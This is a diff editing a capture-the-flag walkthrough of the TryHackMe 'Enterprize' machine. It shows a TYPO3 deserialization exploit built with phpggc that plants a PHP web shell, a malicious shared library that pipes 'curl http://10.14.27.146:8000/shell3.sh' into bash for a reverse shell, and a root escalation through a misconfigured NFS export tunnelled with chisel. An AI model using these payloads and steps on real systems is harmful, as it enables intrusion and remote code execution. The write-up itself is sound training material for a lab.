@@ -127,7 +127,7 @@ ________________________________________________
 maintest                [Status: 200, Size: 24555, Words: 1438, Lines: 49]
 ```
 
-And we have a location of typo3.
+And we have a location of typo3 cms.
 
 ### maintest.enterprize.thm dirs brute-force
 
@@ -177,7 +177,7 @@ cat ~/thm/enterprize/backdoor.php
 <?php $output = system($_GET[1]); echo $output ; ?>
 ```
 
-As author of the article, we use phpggc to gain gadget chain to write our payload:
+As author of the article, we use phpggc to gain gadget chain to write our backdoor in a specified file on a server:
 
 ```
 ./phpggc -b --fast-destruct Guzzle/FW1 /var/www/html/public/fileadmin/_temp_/shell.php ~/thm/enterprize/backdoor.php
@@ -202,10 +202,84 @@ php ~/thm/enterprize/generate_hmac.php
 YToyOntpOjc7TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6MzM6IgBHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUAZGF0YSI7YTozOntzOjc6IkV4cGlyZXMiO2k6MTtzOjc6IkRpc2NhcmQiO2I6MDtzOjU6IlZhbHVlIjtzOjUyOiI8P3BocCAkb3V0cHV0ID0gc3lzdGVtKCRfR0VUWzFdKTsgZWNobyAkb3V0cHV0IDsgPz4KIjt9fX1zOjM5OiIAR3V6emxlSHR0cFxDb29raWVcQ29va2llSmFyAHN0cmljdE1vZGUiO047czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6NDc6Ii92YXIvd3d3L2h0bWwvcHVibGljL2ZpbGVhZG1pbi9fdGVtcF8vc2hlbGwucGhwIjtzOjUyOiIAR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphcgBzdG9yZVNlc3Npb25Db29raWVzIjtiOjE7fWk6NztpOjc7fQ==63624213e24dd952ec588b4d75a6aaad32f0e636
 ```
 
-Intercept the request of your form submition and paste payload + hmac in state field. Now, we have RCE at `/var/www/html/public/fileadmin/_temp_/shell.php`.
+Intercept the request of your form submition and paste payload + hmac in \_\_state field. Now, we have RCE at `/var/www/html/public/fileadmin/_temp_/shell.php`.
 
 For some reason, my ip was blocked by target machine, so i switched vpn and got reverse shell with simple curl and bash reverse shell in shell.sh.
 
 ## Privilege escalation
 
-Exploring john home directory found binary file myapp that loads `/usr/bin/libcustom.so`. Exfiltrate myapp and libcustom.so to your machine for further analysis.
+### john
+
+Exploring john's home directory found binary file `myapp` that loads `/usr/bin/libcustom.so`. Exfiltrate myapp and libcustom.so to your machine for further analysis.\
+I analysed the binary and lib. myapp just loads do\_ping function from library. That function puts Test... in stdout. PayloadsAllTheThings suggests further: [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#shared-library](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#shared-library). With this in mind, we check /etc/ld.so.conf.d/ folder on configs from where to load libraries. Inside, we see:
+
+```
+www-data@enterprize:/home/john/develop$ ls -la /etc/ld.so.conf.d/
+ls -la /etc/ld.so.conf.d/
+total 16
+drwxr-xr-x  2 root root 4096 Jan  3  2021 .
+drwxr-xr-x 98 root root 4096 Aug  1 18:32 ..
+-rw-r--r--  1 root root   44 Jan 27  2016 libc.conf
+lrwxrwxrwx  1 root root   28 Jan  3  2021 x86_64-libc.conf -> /home/john/develop/test.conf
+-rw-r--r--  1 root root  100 Apr 16  2018 x86_64-linux-gnu.conf
+```
+
+So, a file x86\_64-libc.conf is actual symlink on file `/home/john/develop/test.conf` which john deleted, I think. We can write inside `/home/john/develop/`, thus, we control of what library to load instead of `libcustom.so`. Next step is to create a library for replacement:
+
+```c
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/types.h>
+
+void do_ping(){
+    system("curl http://10.14.27.146:8000/shell3.sh | bash");
+}
+
+```
+
+Compile it with `gcc -Wall -fPIC -shared -o libcustom.so libcustom.c`. Then, upload it on the box and move in a folder you like. Then, write this folder in `test.conf`.
+
+One big moment here is myapp which is running as cronjob every 2 minutes. You can be sure of it from pspy output:
+
+```
+2022/08/01 18:18:01 CMD: UID=0    PID=2002   | /sbin/ldconfig.real 
+2022/08/01 18:18:01 CMD: UID=0    PID=2001   | /bin/sh -c /sbin/ldconfig 
+2022/08/01 18:18:01 CMD: UID=1000 PID=2000   | /bin/sh -c /home/john/develop/myapp > /home/john/develop/result.txt 
+2022/08/01 18:18:01 CMD: UID=0    PID=1999   | /usr/sbin/CRON -f 
+2022/08/01 18:18:01 CMD: UID=0    PID=1998   | /usr/sbin/CRON -f
+```
+
+Now, we are waiting for a shell to spawn. &#x20;
+
+### root
+
+linpeas.sh showed the method for privesc:
+
+```
+╔══════════╣ Analyzing NFS Exports Files (limit 70)
+-rw-r--r-- 1 root root 465 Jan  3  2021 /etc/exports
+/var/nfs        localhost(insecure,rw,sync,no_root_squash,no_subtree_check)
+```
+
+This misconfiguration allows us to mount the folder on our machine and create a SUID binary to escalate privileges to root. But the port 2049 isn't accessible from our machine. Alright, let's use chisel for port forwarding (you can also use john's private ssh key to access and do port forwarding via ssh).
+
+```
+KALI: ./chisel server --reverse -p 8082
+TARGET: ./chisel client 10.14.27.146:8082 R:2049:127.0.0.1:2049
+```
+
+Now, we can interact with our local 2049 port. I prepared and copied sh binary from target machine (`mv /bin/sh /var/www/html/public/fileadmin/_temp_/sh` as www-data) as target-box denies to execute sh from kali machine because of missed necessary libraries.&#x20;
+
+```
+mkdir /tmp/pe
+sudo mount -t nfs 127.0.0.1:/var/nfs /tmp/pe
+cp ~/Downloads /tmp/pe/sh
+sudo chown root:root /tmp/pe/sh
+sudo chmod +xs /tmp/pe/sh
+```
+
+```
+cd /var/nfs && ./sh -p
+```
+
+Thus, we got a root user.
